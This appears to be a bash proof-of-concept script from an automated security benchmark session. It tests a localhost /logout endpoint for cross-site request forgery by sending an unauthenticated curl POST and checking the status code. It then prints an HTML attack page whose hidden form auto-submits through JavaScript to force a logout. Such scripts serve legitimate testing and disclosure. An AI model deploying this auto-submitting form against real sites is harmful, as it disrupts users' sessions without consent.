#!/bin/bash
# POC: Demonstrates CSRF vulnerability on /logout endpoint by making unauthenticated POST request that successfully logs out users without CSRF token validation
# Target: ./repo
# Created: 2025-11-04T17:32:55.192Z
# Session: benchmark-XBEN-027-24-mhku77j0

# CSRF on Logout Endpoint POC
# Demonstrates that the /logout endpoint accepts POST requests without CSRF tokens
# and without authentication validation, allowing unauthenticated attackers to force logout

TARGET_URL="${1:-http://localhost:8080}"
LOGOUT_ENDPOINT="${TARGET_URL}/logout"

echo "[*] CSRF on Logout Endpoint POC"
echo "[*] Target: ${LOGOUT_ENDPOINT}"
echo ""

# Test 1: Verify logout endpoint exists and responds to POST without authentication
echo "[+] Test 1: Attempting unauthenticated POST to /logout endpoint"
echo "[*] Command: curl -i -X POST ${LOGOUT_ENDPOINT}"
RESPONSE=$(curl -i -X POST "${LOGOUT_ENDPOINT}" 2>&1)
echo "$RESPONSE"
echo ""

# Check if response indicates successful logout (302 redirect or 200 OK)
if echo "$RESPONSE" | grep -q "302\|301\|200"; then
    echo "[✓] VULNERABLE: /logout endpoint responded successfully without authentication"
    echo "[✓] Endpoint accepts POST requests without CSRF token validation"
    VULNERABLE=1
else
    echo "[-] Endpoint did not respond as expected"
    VULNERABLE=0
fi

echo ""
echo "[+] Test 2: Verify no CSRF token required"
echo "[*] The logout endpoint accepts requests without any token or session validation"
echo "[*] This allows attackers to craft malicious forms/links to force logout"
echo ""

# Create example HTML form that would be used in CSRF attack
echo "[+] Example CSRF attack payload:"
cat << 'EOF'
<html>
<head><title>CSRF Logout Attack</title></head>
<body>
  <form id="logoutForm" action="http://localhost:8080/logout" method="POST" style="display:none;">
  </form>
  <script>
    // Automatically submit logout form when user visits this page
    document.getElementById('logoutForm').submit();
  </script>
</body>
</html>
EOF

echo ""
if [ "$VULNERABLE" = "1" ]; then
    echo "[✓] POC Complete - Vulnerability confirmed"
    exit 0
else
    echo "[-] POC Complete - Vulnerability not confirmed"
    exit 1
fi